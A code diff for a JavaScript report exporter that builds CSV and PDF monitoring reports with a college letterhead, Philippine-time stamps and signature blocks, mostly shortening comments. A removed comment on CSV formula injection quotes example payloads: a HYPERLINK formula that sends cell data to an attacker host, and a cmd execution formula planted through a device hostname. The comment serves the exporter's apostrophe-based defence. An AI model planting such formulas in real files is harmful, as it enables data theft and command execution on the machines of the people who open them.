@@ -7,19 +7,16 @@ import { paperDimensions, formatPH, signatoriesPerRow } from "./reportTemplate.j
 import { drawChart, chartHeight } from "./reportChart.js";
 
 // ─── Body font ───────────────────────────────────────────────────────────────
-// ICTU asked for Arial 11/12. Arimo is metrically IDENTICAL to Arial (verified: a
-// 46-char string at 11pt measures 248.83pt in both) and is OFL-licensed, so it can
-// actually ship in this repo — Arial cannot. See assets/fonts/README.md for the
-// licensing reasoning and the measurements.
+// ICTU asked for Arial 11/12. Arimo has the same metrics as Arial and is
+// OFL-licensed, so it can be shipped in the repo. See assets/fonts/README.md.
 const FONTS = path.join(path.dirname(fileURLToPath(import.meta.url)), "../assets/fonts");
 const FONT_FILES = {
   regular: path.join(FONTS, "Arimo-Regular.ttf"),
   bold: path.join(FONTS, "Arimo-Bold.ttf"),
 };
 
-// Registered names used throughout. They resolve to Arimo when the files are present
-// and to pdfkit's built-ins otherwise, so a deployment that lost assets/fonts/ still
-// produces a report — in Helvetica, which is what it produced before this existed.
+// Font names used throughout. They map to Arimo when the files exist and to
+// pdfkit's built-in Helvetica otherwise, so a report is still produced.
 const BODY = "Body";
 const BODY_BOLD = "Body-Bold";
 const haveBodyFont = fs.existsSync(FONT_FILES.regular) && fs.existsSync(FONT_FILES.bold);
@@ -27,9 +24,7 @@ const F = haveBodyFont
   ? { reg: BODY, bold: BODY_BOLD }
   : { reg: "Helvetica", bold: "Helvetica-Bold" };
 
-// The embedded font is the authority on what can be DRAWN, so open it once here for
-// the coverage test in renderable(). Opened directly rather than reached through
-// pdfkit's internals, which are private and change between releases.
+// Open the embedded font once so renderable() can check which characters it has.
 let bodyGlyphs = null;
 if (haveBodyFont) {
   try {
@@ -51,24 +46,17 @@ function registerBodyFont(doc) {
   }
 }
 
-// Letterhead marks are RESOLVED BY THE CALLER and arrive as absolute paths on
-// `report.branding`. They used to be read from a fixed folder beside this module,
-// which made the logo a thing only someone with repo access could change — and ICTU
-// asked for it to be theirs ("what if they change logo"). reportBrandingService now
-// decides which file is live (an admin upload, else the bundled default); this module
-// only draws whatever it is handed, which keeps it store-agnostic in the same way it
-// already is about where the numbers came from.
+// Logos come in as absolute paths on `report.branding`; reportBrandingService picks
+// the file (an admin upload, else the bundled default). This module only draws.
 
-// Turns a normalized report object into the two downloadable formats (CSV + PDF).
-// A "report" here is store-agnostic — reportService builds it from InfluxDB/MySQL,
-// this module only knows how to lay it out. Shape:
+// Turns a report object into the two download formats (CSV + PDF). reportService
+// builds the object from InfluxDB/MySQL; this module only lays it out. Shape:
 //   { title, type, periodStart, periodEnd, generatedAt,
 //     summary: [{ label, value }], table: { columns: [...], rows: [[...]] } }
 //
-// A report may instead carry `tables: [{ title, columns, rows }]` when one flat
-// table can't say it — the network report needs a per-device roll-up AND a
-// per-interface breakdown. `table` stays supported and renders as a single
-// "Details" section, so the older builders are untouched.
+// A report may use `tables: [{ title, columns, rows }]` instead when it needs more
+// than one table (e.g. network: per device and per interface). `table` still works
+// and renders as one "Details" section.
 
 // Normalize either shape into an array of titled sections.
 function sections(report) {
@@ -82,18 +70,12 @@ function sections(report) {
   return [{ title: "Details", columns: report.table?.columns ?? [], rows: report.table?.rows ?? [] }];
 }
 
-// Every timestamp in a generated report is PHILIPPINE time.
-//
-// ICTU asked for local time, not UTC. Nothing upstream changed: InfluxDB points and
-// MySQL rows are still stored in UTC, and this converts at the last possible moment,
-// for a document a person reads. The " PHT" suffix is load-bearing rather than
-// decorative — the same report gets read beside a dashboard rendering in the viewer's
-// own locale, and an untagged timestamp gives nobody a way to tell them apart.
+// All timestamps in a report are Philippine time (ICTU asked for local time). Data is
+// stored in UTC and converted here. The " PHT" suffix makes the timezone explicit.
 const fmtTs = formatPH;
 
-// A report's identity block: the labelled lines under the title. Built by
-// reportService (which knows the reference number, the operator and the device) and
-// rendered verbatim here, so adding a field never means touching the layout.
+// The identity block (labelled lines under the title). Built by reportService and
+// drawn as given, so adding a field does not touch the layout.
 function metaRows(report) {
   if (Array.isArray(report.meta) && report.meta.length) {
     return report.meta.filter((m) => m && m.label);
@@ -108,31 +90,18 @@ function metaRows(report) {
 }
 
 // ─── CSV ──────────────────────────────────────────────────────────────────────
-// A cell whose text starts with one of these is executed as a FORMULA by Excel,
-// LibreOffice and Google Sheets when the file is opened.
+// A cell starting with one of these is run as a formula by Excel, LibreOffice and
+// Google Sheets.
 const FORMULA_START = /^[=+\-@\t\r]/;
 
 // ─── CSV formula injection (CWE-1236) ─────────────────────────────────────────
+// Quoting only makes a cell parse; a cell like `=HYPERLINK(...)` still runs as a
+// formula when opened. Report titles come from the request and device names from
+// the agent's hostname (not validated), so such text can reach a CSV. A leading
+// apostrophe makes the spreadsheet treat it as text.
 //
-// RFC 4180 quoting — the `/[",\n\r]/` test below — makes a cell PARSE correctly. It does
-// nothing about what a spreadsheet DOES with the parsed text: a cell reading
-// `=HYPERLINK("http://attacker/?"&A1,"Open")` is a live formula the moment someone opens
-// the download, and it can read other cells and send them somewhere.
-//
-// That text is reachable. A report `title` comes from the request body
-// (`POST /api/reports`), and device names come from `devices.device_name`, which
-// `agentService.register` fills straight from the **agent-supplied hostname** with no
-// character validation. So a machine enrolling itself as `=cmd|'/c calc'!A1` plants a
-// formula that fires later, on an ICTU staffer's PC, when someone exports a report —
-// the classic stored/deferred shape, in a file the feature exists to hand around.
-//
-// Prefixing with an apostrophe is the standard neutralisation: spreadsheets treat the
-// rest as literal text and hide the quote.
-//
-// ⚠️ Numbers are deliberately exempt. `-12.5` starts with `-`, and prefixing it would turn
-// a real measurement into a text cell — every negative value in the sheet would stop being
-// summable. `Number.isFinite(Number(s))` keeps numeric columns numeric while still
-// catching a lone `-` or `=1+1`, both of which are NaN.
+// Numbers are left alone: prefixing `-12.5` would turn it into text and break sums.
+// Number.isFinite still catches a lone `-` or `=1+1`, which are NaN.
 function csvCell(v) {
   const s = v === null || v === undefined ? "" : String(v);
   const guarded = FORMULA_START.test(s) && !Number.isFinite(Number(s)) ? `'${s}` : s;
@@ -144,17 +113,13 @@ function csvRow(arr) {
 
 export function toCSV(report) {
   const lines = [];
-  // The CSV carries the SAME identity block as the PDF, in the same order. The two
-  // files are one report in two formats — a spreadsheet that omitted the reference
-  // number or the operator would be the copy people quote from precisely because it
-  // is easier to open, and it would be the copy that could not be traced.
+  // The CSV has the same identity block as the PDF, in the same order, so either
+  // copy can be traced.
   if (report.referenceNo) lines.push(csvRow(["Reference No.", report.referenceNo]));
   lines.push(csvRow(["Title", report.title]));
   for (const m of metaRows(report)) lines.push(csvRow([m.label, m.value]));
-  // A spreadsheet has no signature block, so any name the PDF prints on one is carried
-  // here as a field. Without this the CSV — the copy people quote from, because it opens
-  // easier — would be the one that names nobody. Unnamed lines are skipped: a row
-  // reading "Approved by," with nothing after it says less than no row at all.
+  // A spreadsheet has no signature block, so names printed on the PDF's signature
+  // lines are added as fields. Lines without a name are skipped.
   for (const s of report.signatories ?? []) {
     if (s?.name) lines.push(csvRow([String(s.role).replace(/:$/, ""), s.name]));
   }
@@ -195,48 +160,27 @@ const MUTED = "#6B7280";
 const ROW_ALT = "#f3f4f6";
 const BORDER = "#d1d5db";
 
-// CSPC's institutional blue — "Madison". The ONE blue in a generated report: the
-// letterhead rule and every table header are drawn in it.
-//
-// Deliberately a single constant. Sampling the seal in the letterhead image gives
-// #002878, and the table header used to be a generic #2563EB, so a document could carry
-// three different blues — which reads as an accident rather than as branding. The brand
-// value wins over the sampled one: a scanned JPEG's ink is a measurement of that scan,
-// not of the institution's colour.
+// CSPC blue ("Madison"), the one blue in a report: the letterhead rule and every
+// table header use it.
 const CSPC_BLUE = "#0F2E66";
 
 // ─── Type sizes ──────────────────────────────────────────────────────────────
-// ICTU asked for Arial 11/12 (reports-client-questionnaire.md). That is a BODY-TEXT
-// instruction, and it is applied literally to every piece of prose in the document:
-// the identity block, the summary, the signature block. It cannot be applied to a
-// nine-column data grid on a portrait page — measured, those columns need 617pt of a
-// 532pt printable width at 11pt — so drawTable fits each table independently instead,
-// starting from 11 and dropping only as far as that particular table requires.
+// Arial 11/12 (reports-client-questionnaire.md) applies to body text: identity
+// block, summary, signature block. Wide tables do not fit at 11pt on a portrait
+// page, so drawTable sizes each table on its own, starting at 11.
 const BODY_PT = 11;
-// Letterhead unit line. Always one line, shrinking within these bounds to fit the width
-// beside the logos — the floor is where the masthead stops out-ranking the college name
-// above it, not where it becomes unreadable.
+// Letterhead unit line: always one line, shrinking within these bounds to fit
+// beside the logos.
 const UNIT_MAX_PT = 15;
 const UNIT_MIN_PT = 9;
 const HEADING_PT = 12.5;
 const CSPC_BLACK = "#000000";
 
-// Text reaching a PDF must be limited to what the chosen font can actually DRAW.
-//
-// This began as a WinAnsi fold, because pdfkit's built-in fonts are single-byte: hand
-// one a codepoint outside that set and it does not throw, it writes the bytes raw, so
-// "→" left the Period line reading "!’" in every report ever generated. Report titles
-// and device names are user-typed and reach this file verbatim, so one pasted character
-// could do the same again at any time.
-//
-// Embedding Arimo did NOT make the problem go away, it moved it. The file shipped here
-// is the gstatic latin subset: full ASCII and full Latin-1 (so accented names now render
-// properly, which WinAnsi also allowed), but NO arrows or maths symbols — measured
-// coverage is in assets/fonts/README.md. A naive "we have a real TrueType font now, drop
-// the guard" would have silently replaced every "→" with a blank box.
-//
-// So the test is now the FONT's own glyph table rather than a hardcoded encoding. Swap
-// in a fuller cut and more characters survive automatically, with no code change.
+// Only draw characters the font actually has. pdfkit writes unknown characters as
+// raw bytes (e.g. "→" came out as "!’"), and titles and device names are typed by
+// users. The bundled Arimo is a Latin subset without arrows or maths symbols (see
+// assets/fonts/README.md), so the check uses the font's own glyph table; a fuller
+// font would allow more characters with no code change.
 const CP1252_EXTRA = "€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ";
 const TRANSLIT = {
   "→": "->", "←": "<-", "↔": "<->", "≤": "<=", "≥": ">=",
@@ -280,9 +224,7 @@ function latin1(v) {
 }
 
 
-// Measuring every row of a long table at every candidate size is O(rows x cols x sizes).
-// An alert-history report can carry hundreds of rows, so width sampling is capped —
-// column widths are a layout decision, and 200 rows determine it as well as 2000 do.
+// Width sampling is capped at 200 rows; more rows do not change the column widths.
 const WIDTH_SAMPLE_ROWS = 200;
 
 /** Width each column needs at `size`: its header, or its widest sampled cell. */
@@ -301,36 +243,12 @@ function measureColumns(doc, columns, rows, size, padX) {
   });
 }
 
-// ICTU asked for Arial 11/12. That is a BODY-TEXT instruction — no institutional
-// template sets a nine-column data grid at 12pt, and on a portrait folio it does not
-// physically fit. Measured natural widths at 11pt against a 532pt printable folio:
+// Table sizing. Tables start at 11pt and only go smaller if their own content needs
+// it, so small tables keep the full size.
 //
-//   environment (6 cols)      442pt   fits
-//   availability (5 cols)     294pt   fits
-//   alerts (6 cols)           479pt   fits
-//   aircon (6 cols)           527pt   fits — until one long "Reason" pushes it over
-//   resource util (9 cols)    603pt   does NOT fit
-//   network devices (12 cols) 729pt   does NOT fit
-//   ups gauges (9 cols)       796pt   does NOT fit
-//
-// So tables start at 11 and step down only as far as THEIR OWN content requires. A
-// five-column table gets the full 11pt; the nine-column Resource Utilization drops to
-// about 9.5. Sizing every table by the worst one would shrink the readable tables for
-// nothing.
-//
-// ⚠️ A HEADER IS NEVER TRUNCATED. That is the rule the whole layout is built around.
-//
-// First attempt held 11pt by squeezing every column toward a flat 30pt floor and
-// wrapping. It broke headers: wrapping only breaks at whitespace, so "Trigger" — one
-// token, no spaces — had nowhere to break and came out as "Tri…". A column whose
-// heading is unreadable is worse than one set two points smaller, because the heading is
-// what makes the numbers mean anything.
-//
-// The floor is now PER COLUMN and equals that header's widest unbreakable TOKEN. A
-// multi-word header ("Avg Charge %") may wrap onto two lines; a single-word header
-// ("Trigger") sets a floor equal to its own full width and can never be squeezed at all.
-//
-// Measured against a 532pt printable folio, that floor lets EVERY table sit at 11pt:
+// Headers are never cut off. Each column's minimum width is its widest single word
+// (header or value), so text only wraps to more lines, never gets truncated. With
+// this, every current table fits at 11pt on a 532pt-wide folio page:
 //
 //   table                  full headers   token floor
 //   resource util (9)          601pt         299pt
@@ -338,25 +256,13 @@ function measureColumns(doc, columns, rows, size, padX) {
 //   ups voltages (9)           577pt         368pt
 //   network devices (12)       619pt         399pt
 //   aircon (6)                 220pt         220pt   (all single words — no squeeze)
-//
-// The size also no longer depends on a table's DATA. It used to be driven by the widest
-// cell, which is why one long aircon "Reason" shrank that whole report while a server
-// report stayed large, and why the same report could come out at different sizes on
-// different days.
 const TABLE_MAX_PT = 11;
 const TABLE_MIN_PT = 7.5;
 
 
 /**
- * The narrowest a column may become: the widest unbreakable TOKEN anywhere in it —
- * its header, or any of its values.
- *
- * Text wraps at whitespace, so a column at least this wide can always show every word
- * whole; it only ever costs extra LINES, never a cut-off word. "Huawei Router
- * (ISP-owned)" needs room for "(ISP-owned)", not for the whole phrase.
- *
- * Header AND cells, because the requirement is that every VALUE reads completely, not
- * just every heading.
+ * The narrowest a column may be: its widest single word, in the header or any
+ * value. At that width every word fits whole; long text just takes more lines.
  */
 function columnFloor(doc, header, rows, index, size, padX) {
   doc.font(F.bold).fontSize(size);
@@ -403,9 +309,7 @@ function drawTable(doc, columns, rows) {
   const padY = 3;
 
   // ── Size ──
-  // The largest size at which every column can still be at least as wide as its widest
-  // WORD — heading or value. At that width nothing is ever cut mid-word; long text
-  // simply takes more lines.
+  // The largest size at which every column still fits its widest word.
   let size = TABLE_MIN_PT;
   for (let s = TABLE_MAX_PT; s >= TABLE_MIN_PT; s -= 0.5) {
     const floorSum = columns.reduce((a, c, i) => a + columnFloor(doc, c, rows, i, s, padX), 0);
@@ -418,9 +322,8 @@ function drawTable(doc, columns, rows) {
   const floors = columns.map((c, i) => columnFloor(doc, c, rows, i, size, padX));
 
   // ── Widths ──
-  // Natural = what the column would like: its full header, or its widest cell.
-  // Proportional, never equal slices — equal slices gave "Incidents" the same room as a
-  // server name, so the name truncated while a one-digit number sat in white space.
+  // Natural width = the full header or the widest cell. Space is shared in proportion,
+  // not equally, so a long name gets more room than a one-digit number.
   const natural = measureColumns(doc, columns, rows, size, padX);
   const need = natural.reduce((a, b) => a + b, 0);
   let widths;
@@ -431,9 +334,8 @@ function drawTable(doc, columns, rows) {
     const slack = totalW - need;
     widths = natural.map((w) => w + (slack * w) / need);
   } else {
-    // Over budget: every column keeps its floor and gives up the SAME FRACTION of what
-    // it wanted beyond it. Solved directly rather than iterated — one k satisfies the
-    // total exactly, and no column can be pushed under its floor.
+    // Too wide: every column keeps its floor and gives up the same fraction of the
+    // extra width it wanted. Solved directly, so no column goes under its floor.
     const floorSum = floors.reduce((a, b) => a + b, 0);
     const flexSum = need - floorSum;
     const k = flexSum > 0 ? Math.max(0, (totalW - floorSum) / flexSum) : 0;
@@ -449,8 +351,7 @@ function drawTable(doc, columns, rows) {
   const inner = widths.map((w) => w - padX * 2);
 
   // ── Header ──
-  // Wrapped, NEVER truncated: the column is at least as wide as its widest token, so
-  // every word fits. Height follows whatever wrapping it needed.
+  // Wrapped, never truncated.
   doc.font(F.bold).fontSize(size);
   const headerText = columns.map((c) => renderable(c));
   const headerH =
@@ -475,9 +376,7 @@ function drawTable(doc, columns, rows) {
 
   rows.forEach((row, ri) => {
     doc.font(F.reg).fontSize(size);
-    // Cells WRAP rather than truncate: every column is at least as wide as its widest
-    // word, so a long value costs extra lines and never a cut-off name. A row is as
-    // tall as its tallest cell.
+    // Cells wrap rather than truncate; a row is as tall as its tallest cell.
     const cells = columns.map((_, ci) => wrapSafe(doc, row[ci], inner[ci]));
     let rowH =
       Math.max(MIN_ROW_H, ...cells.map((c, ci) => doc.heightOfString(c, { width: inner[ci] }) + padY * 2));
@@ -500,18 +399,15 @@ function drawTable(doc, columns, rows) {
     y += rowH;
   });
 
-  // Leave the cursor just below the last row. drawTable positions every cell
-  // absolutely, so pdfkit's own doc.y is meaningless by now — a second table (or
-  // anything after it) would otherwise be drawn straight over this one.
+  // Move the cursor below the last row. Cells are placed absolutely, so doc.y is out
+  // of date and the next table would be drawn on top of this one.
   doc.x = left;
   doc.y = y;
   doc.lineWidth(0.5).strokeColor(BORDER);
 }
 
-// doc.image() THROWS on a missing or unreadable file, and reportService.build()
-// is fire-and-forget — an exception here flips the report to `failed` with nothing
-// on the page to say why. A logo that will not load must cost us the logo, never
-// the report, so this reports failure instead of raising it.
+// doc.image() throws on a missing or unreadable file, which would fail the whole
+// report. A logo that will not load only loses the logo.
 function drawLogo(doc, abs, x, y, size) {
   try {
     if (!abs || !fs.existsSync(abs)) return false;
@@ -525,26 +421,10 @@ function drawLogo(doc, abs, x, y, size) {
 }
 
 // ─── Signatories ──────────────────────────────────────────────────────────────
-// THREE lines since 2026-08-28. ICTU was asked whether "Prepared by" and "Noted by"
-// were the right lines and whether "Approved by" was also needed, and confirmed all
-// three. The third is not cosmetic: prepared/noted/approved is the standard Philippine
-// government document chain, and a report filed for accreditation without the approving
-// signature is a document that has not actually been approved by anyone.
-//
-// ⚠️ Only "Prepared by" is ever NAMED, and only from `report.preparedBy` — the person
-// who generated the document, which the system actually knows. "Noted by" and "Approved
-// by" stay blank because nobody has noted or approved anything at the moment a PDF is
-// written: printing a name on those lines would assert an approval that has not happened,
-// on a document filed for accreditation.
-//
-// ICTU's own questionnaire allowed for this — "names may either be automatically printed
-// or left blank for manual signature" — and it replaces the duplicated "Responsible"
-// field that previously sat in the identity block saying the same thing.
-//
-// Still never a signature IMAGE. A printed name under a rule is the standard
-// "signature over printed name" form and the human still signs it; embedding a scanned
-// signature would let anyone who can click Generate produce a document already bearing
-// someone's mark.
+// Prepared by / Noted by / Approved by, as confirmed by ICTU. Only "Prepared by" is
+// filled in automatically (the person who generated the report); the others stay
+// blank, since nobody has noted or approved the report when it is created. Never a
+// signature image: a printed name under a line, signed by hand.
 // Height of one signature column, and of one row of them.
 const SIG_BLOCK_H = 92;
 const SIG_ROW_GAP = 14;
@@ -583,13 +463,9 @@ function drawSignatories(doc, signatories) {
     // ~50pt of clear air below the role — a hand needs room to sign.
     const ruleY = y0 + 50;
 
-    // ── The printed name sits ABOVE the rule ──
-    // ICTU's format: the name is printed and the signature goes across it, so the rule
-    // closes the block underneath rather than carrying the name below it.
-    //
-    // Upper-cased, the convention for a printed name in a Philippine signature block.
-    // Shrinks to fit rather than wrapping — a name broken over two lines would push
-    // into the role label above it.
+    // ── Printed name above the line ──
+    // ICTU's format: the name is printed and signed across. Upper-case, as is usual in
+    // a Philippine signature block. Shrinks to fit instead of wrapping.
     const name = renderable(s.name ?? "").trim().toUpperCase();
     if (name) {
       doc.font(F.bold);
@@ -622,20 +498,11 @@ function drawSignatories(doc, signatories) {
 }
 
 /**
- * The "System Generated Report" mark, on EVERY page.
+ * The "System Generated Report" footer on every page (ICTU's wording), with the
+ * control number, so every sheet of a filed report identifies itself.
  *
- * ICTU's own phrase — they wrote it on the questionnaire beside the timezone question.
- * It matters on a document that carries signature lines: a reader has to be able to tell
- * that the FIGURES were produced by a system and only the signatures are human. The
- * control number rides along because a filed multi-page document should identify itself
- * on every sheet, not only the one with the letterhead.
- *
- * Drawn after all content via bufferPages, which is the only way to know the page COUNT
- * — "Page 1 of 3" cannot be written before page 3 exists.
- *
- * ⚠️ The bottom margin is temporarily zeroed. pdfkit starts a NEW PAGE when text would
- * cross into the bottom margin, so writing a footer there without this would add a blank
- * page per page, forever.
+ * Drawn after all content (bufferPages), since "Page 1 of 3" needs the total. The
+ * bottom margin is set to zero while drawing, or pdfkit would start a new page.
  */
 function drawPageFooters(doc, report) {
   const range = doc.bufferedPageRange();
@@ -668,14 +535,9 @@ function drawPageFooters(doc, report) {
 
 export function toPDFBuffer(report) {
   return new Promise((resolve, reject) => {
-    // Page size is per-report, not a constant. ICTU answered "Dynamic (long -
-    // default)": an admin picks, and the default is Folio/long bond — what CSPC
-    // actually prints on. The size is frozen onto the report row at generate time, so
-    // re-downloading an old report gives back the page it was filed as even after the
-    // default changes. Given as explicit points rather than a pdfkit size name because
-    // Folio has no name in pdfkit's table.
-    // bufferPages so drawPageFooters can revisit every page once the total is known —
-    // "Page 1 of 3" cannot be written before page 3 exists.
+    // Page size is chosen per report (default Folio / long bond) and saved on the
+    // report, so re-downloading gives the same size. Given in points because pdfkit has
+    // no name for Folio. bufferPages so the footer can write "Page 1 of 3".
     const doc = new PDFDocument({ size: paperDimensions(report.paperSize), margin: 40, bufferPages: true });
     const chunks = [];
     doc.on("data", (c) => chunks.push(c));
@@ -686,29 +548,18 @@ export function toPDFBuffer(report) {
     registerBodyFont(doc);
 
     // ── Letterhead ──
-    //
-    // Reproduces CSPC's official letterhead, measured from the sample ICTU supplied
-    // (reports_template/sample_reports_header.png). This replaced our own invented
-    // arrangement — a centred wordmark between two far-apart logos — which looked
-    // nothing like the institution's real stationery.
-    //
-    // The measured structure:
-    //   · both marks LEFT, side by side (not one at each margin)
-    //   · a LEFT-ALIGNED serif text block beside them, four small lines then one large
-    //   · a 2pt rule beneath, GOLD #FFC000 for the first 70.5% of the width and BLACK
-    //     for the remainder — the detail that makes it read as CSPC's at a glance
-    //
-    // Set in Times, not the body font: the sample letterhead is a serif and the
-    // institutional identity should not change when the body font does. Times is a
-    // pdfkit built-in, so this costs no extra font file.
+    // Copies CSPC's official letterhead from ICTU's sample
+    // (reports_template/sample_reports_header.png):
+    //   · both logos on the left, side by side
+    //   · a left-aligned serif text block beside them: four small lines, then one large
+    //   · a rule beneath: CSPC blue for the first 70.5% of the width, then black
+    // Set in Times (a pdfkit built-in) like the sample, independent of the body font.
     const left = doc.page.margins.left;
     const right = doc.page.width - doc.page.margins.right;
     const width = right - left;
     const top = 30;
 
-    // Sized from the sample, where the marks occupy roughly four-fifths of the
-    // letterhead's height. They carry the institutional identity, so they are the one
-    // element worth the vertical space.
+    // Sized from the sample, where the logos are about four-fifths of the letterhead height.
     const LOGO = 62;
     const LOGO_GAP = 8;
 
@@ -726,20 +577,9 @@ export function toPDFBuffer(report) {
     const tw = right - tx;
 
     // ── The unit line ──
-    // Configurable (settings `report.unit_name`) rather than hardcoded: the sample
-    // carries "COLLEGE of COMPUTER STUDIES", an ICTU report should carry ICTU, and
-    // whoever files these next may be neither.
-    //
-    // Sized BEFORE anything is drawn, because the block's height decides where it sits.
-    //
-    // ⚠️ ALWAYS ONE LINE. It briefly wrapped to two so a long name could keep a bigger
-    // size, but a letterhead's unit line is a single line in every institutional
-    // template — two made the block look like a paragraph rather than a masthead.
-    //
-    // So the type shrinks until it fits instead. ICTU's own name is far longer than the
-    // sample's "COLLEGE of COMPUTER STUDIES" and lands at 12pt; a short unit keeps the
-    // full 15. Twelve is still above the 11pt college line, so the hierarchy survives —
-    // narrowly, which is the cost of the one-line rule and worth knowing about.
+    // Configurable (`report.unit_name`). Sized before drawing because its height sets
+    // the layout. Always one line; the font shrinks to fit (ICTU's long name lands at
+    // 12pt, still above the 11pt college line).
     const unit = latin1(report.unitName || "INFORMATION AND COMMUNICATIONS TECHNOLOGY UNIT");
     doc.font("Times-Bold");
     let unitSize = UNIT_MIN_PT;
@@ -772,25 +612,19 @@ export function toPDFBuffer(report) {
       .text(unit, tx, ty, { width: tw, lineBreak: false });
 
     // ── The two-tone rule ──
-    // Blue to 70.5% of the width, then black. The split point is measured off the
-    // sample, not guessed.
+    // Blue to 70.5% of the width, then black, as measured on the sample.
     const ruleY = Math.max(top + LOGO, doc.y) + 8;
     const split = left + width * 0.705;
-    // 3pt, not 2. Same #0F2E66 as the table headers, but a 2pt hairline of a dark navy
-    // antialiases toward grey and reads as a different, weaker colour than the solid
-    // band below it. The extra point is what makes the two register as one blue.
+    // 3pt: at 2pt the dark navy looks greyer than the table headers.
     doc.moveTo(left, ruleY).lineTo(split, ruleY).lineWidth(3).strokeColor(CSPC_BLUE).stroke();
     doc.moveTo(split, ruleY).lineTo(right, ruleY).lineWidth(3).strokeColor(CSPC_BLACK).stroke();
 
     // ── Report identity ──
-    // Absolute positioning above left pdfkit's cursor wherever the last string
-    // ended, so both axes are reset before the flowing content resumes.
+    // The absolute positioning above leaves pdfkit's cursor somewhere else, so reset both axes.
     doc.x = left;
     doc.y = ruleY + 13;
 
-    // The control number sits ABOVE the title and hard right, where a filed document
-    // is read from. ICTU called it "advisable to have"; its whole purpose is to be
-    // findable on a page in a folder, which a line buried among the metadata is not.
+    // Control number above the title, on the right, where it is easy to find in a folder.
     if (report.referenceNo) {
       const titleTop = doc.y;
       doc.fillColor(MUTED).font(F.reg).fontSize(10)
@@ -806,10 +640,8 @@ export function toPDFBuffer(report) {
     doc.moveDown(0.4);
 
     // ── Identity block ──
-    // Label/value pairs rather than free text, because these are fields ICTU named:
-    // server, IP, OS, monitoring period, date created, responsible. Labels are set in
-    // a darker ink than the values they introduce would suggest — the label is the
-    // thing a reader scans for.
+    // Label/value pairs for the fields ICTU asked for: server, IP, OS, monitoring
+    // period, date created, responsible.
     const LABEL_W = 140;
     doc.font(F.reg).fontSize(BODY_PT);
     for (const m of metaRows(report)) {
@@ -839,9 +671,7 @@ export function toPDFBuffer(report) {
     }
 
     // ── Charts ──
-    // Between the summary and the tables on purpose: a reader sees the shape of the
-    // period first, then the numbers that produced it. Drawn as vectors, so they stay
-    // sharp when printed and add no dependency.
+    // Between the summary and the tables, so the reader sees the trend before the numbers.
     for (const chart of report.charts ?? []) {
       const need = chartHeight(chart);
       // Keep a chart whole. Half a plot at the foot of a page with its axis overleaf is
